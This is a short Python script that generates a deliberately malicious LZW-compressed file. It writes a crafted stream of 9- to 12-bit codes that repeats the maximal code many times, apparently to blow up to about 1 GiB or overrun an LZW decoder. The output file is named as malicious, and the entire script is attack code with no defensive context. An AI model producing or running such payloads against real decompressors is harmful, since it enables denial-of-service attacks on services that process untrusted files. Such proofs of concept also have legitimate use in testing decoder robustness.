#!/usr/bin/env python3

LIMIT_FOR_1GiB = 277_775

a09 = list(range(1<<8,1<<9))
a09[1] = 0xFF # Any u8 value will do
b09 = "".join([f"{i:09b}" for i in a09])

b10 = "".join([f"{i:010b}" for i in range(1<<9, 1<<10)])
b11 = "".join([f"{i:011b}" for i in range(1<<10, 1<<11)])
b12 = "".join([f"{i:012b}" for i in range(1<<11, 1<<12)])
b13 = "".join([f"111111111111" for _ in range(1<12, LIMIT_FOR_1GiB)])

b_str = b09 + b10 + b11 + b12 + b13
padding = 8 - len(b_str) % 8
b_str += "0" * padding

b_array = [b_str[i:i+8] for i in range(0, len(b_str), 8)]

with open("NO_ID_lzw_malicious.bin", "wb") as f:
    f.write(bytes([int(i, 2) for i in b_array]))
